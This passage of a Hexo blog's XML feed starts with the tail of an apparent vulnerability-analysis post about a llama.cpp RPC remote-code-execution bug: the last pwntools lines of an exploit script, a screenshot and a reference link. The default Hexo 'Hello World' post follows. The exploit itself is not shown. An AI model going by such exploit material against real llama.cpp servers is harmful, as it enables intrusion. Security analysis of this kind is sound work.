class="line"></span><br><span class="line"><span class="comment"># ipdb.set_trace()</span></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/09/15/llama-cpp-tensor-rce1/../llama-cpp-tensor-rce1/57522d58feaca004bcd1723d62a4adec.png"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://pwner.gg/blog/2024-10-03-llama-cpp-cves">Pwning LLaMA.cpp RPC Server</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;24 年的时候，llama.cpp 出了两个漏洞 &lt;a href=&quot;https://github.com/ggerganov/llama.c</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://the-soloist.github.io/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="LLM" scheme="https://the-soloist.github.io/tag/LLM/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://the-soloist.github.io/1901/01/01/hello-world/"/>
    <id>https://the-soloist.github.io/1901/01/01/hello-world/</id>
    <published>1900-12-31T16:00:00.000Z</published>
    <updated>2025-12-17T15:05:33.000Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
